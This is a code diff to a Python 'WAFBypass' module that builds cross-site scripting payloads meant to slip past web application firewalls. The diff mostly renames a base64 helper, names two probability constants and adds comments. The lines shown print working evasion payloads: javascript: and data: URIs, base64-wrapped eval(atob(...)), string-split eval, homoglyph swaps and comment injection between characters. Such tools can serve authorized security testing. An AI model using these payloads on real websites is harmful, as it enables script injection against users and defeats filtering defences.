@@ -12,6 +12,11 @@ import random
 from config import Colors
 
 
+# Probability thresholds for mutation/bypass randomization
+_HOMOGLYPH_SUBSTITUTION_PROB = 0.5   # chance of replacing a char with its homoglyph
+_COMMENT_INJECTION_PROB = 0.3        # chance of inserting a comment between chars
+
+
 class WAFBypass:
     """WAF Bypass Module"""
     
@@ -203,9 +208,9 @@ class WAFBypass:
         """
         payloads = []
         
-        alert_func = base_payload if base_payload else 'alert(1)'
+        alert_payload = base_payload if base_payload else 'alert(1)'
         # Strip surrounding script tags if present for embedding
-        inner = re.sub(r'</?script[^>]*>', '', alert_func, flags=re.IGNORECASE).strip()
+        inner = re.sub(r'</?script[^>]*>', '', alert_payload, flags=re.IGNORECASE).strip()
         if not inner:
             inner = 'alert(1)'
         
@@ -240,7 +245,7 @@ class WAFBypass:
             f'<a href="javascript:{inner}">click</a>',
             f'<a href="javascript:{encoded_inner}">click</a>',
             f'<a href="data:text/html,<script>{inner}</script>">click</a>',
-            f'<a href="data:text/html;base64,{self._b64_inner("<script>" + inner + "</script>")}">click</a>',
+            f'<a href="data:text/html;base64,{self._base64_encode("<script>" + inner + "</script>")}">click</a>',
             f'<a href="vbscript:MsgBox(1)">click</a>',
             f'<iframe src="javascript:{inner}">',
             f'<object data="javascript:{inner}">',
@@ -273,7 +278,7 @@ class WAFBypass:
         payloads.extend([
             f'<script>document.write("<img src=x onerror={inner}>")</script>',
             f'<script>document.body.innerHTML="<img src=x onerror={inner}>"</script>',
-            f'<script>eval(atob("{self._b64_inner(inner)}"))</script>',
+            f'<script>eval(atob("{self._base64_encode(inner)}"))</script>',
             f'<script>eval("al"+"ert(1)")</script>',
             f'<script>window["eval"]({inner})</script>',
             f'<script>this["alert"](1)</script>',
@@ -323,7 +328,7 @@ class WAFBypass:
         
         return payloads
     
-    def _b64_inner(self, inner: str) -> str:
+    def _base64_encode(self, inner: str) -> str:
         """Base64 encode a string for use in evasion payloads.
         
         Uses a pure-Python base64 implementation to avoid additional imports.
@@ -334,16 +339,20 @@ class WAFBypass:
         Returns:
             Base64-encoded string.
         """
+        # Standard base64 alphabet
         b64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
         data = inner.encode('utf-8')
         result = []
+        # Process 3 bytes at a time → 4 base64 characters (RFC 4648)
         for i in range(0, len(data), 3):
             chunk = data[i:i + 3]
+            # Left-align partial chunks in a 24-bit integer
             n = int.from_bytes(chunk, 'big') << (8 * (3 - len(chunk)))
-            num_output = len(chunk) + 1
+            num_output = len(chunk) + 1  # 1 byte→2 chars, 2→3, 3→4
             for j in range(num_output):
+                # Extract 6-bit groups from the 24-bit integer
                 result.append(b64_chars[(n >> (18 - 6 * j)) & 0x3F])
-            result.extend(['='] * (4 - num_output))
+            result.extend(['='] * (4 - num_output))  # pad to 4-char boundary
         return ''.join(result)
     
     def regex_bypass_generate(self, payload: str, context: str = 'xss') -> list:
@@ -373,7 +382,7 @@ class WAFBypass:
         }
         homoglyph_payload = ''
         for c in payload:
-            if c in homoglyphs and random.random() < 0.5:
+            if c in homoglyphs and random.random() < _HOMOGLYPH_SUBSTITUTION_PROB:
                 homoglyph_payload += homoglyphs[c]
             else:
                 homoglyph_payload += c
@@ -404,7 +413,7 @@ class WAFBypass:
             while i < len(payload):
                 commented += payload[i]
                 if payload[i].isalpha() and i + 1 < len(payload) and payload[i + 1].isalpha():
-                    if random.random() < 0.3:
+                    if random.random() < _COMMENT_INJECTION_PROB:
                         commented += comment
                 i += 1
             variants.append(commented)
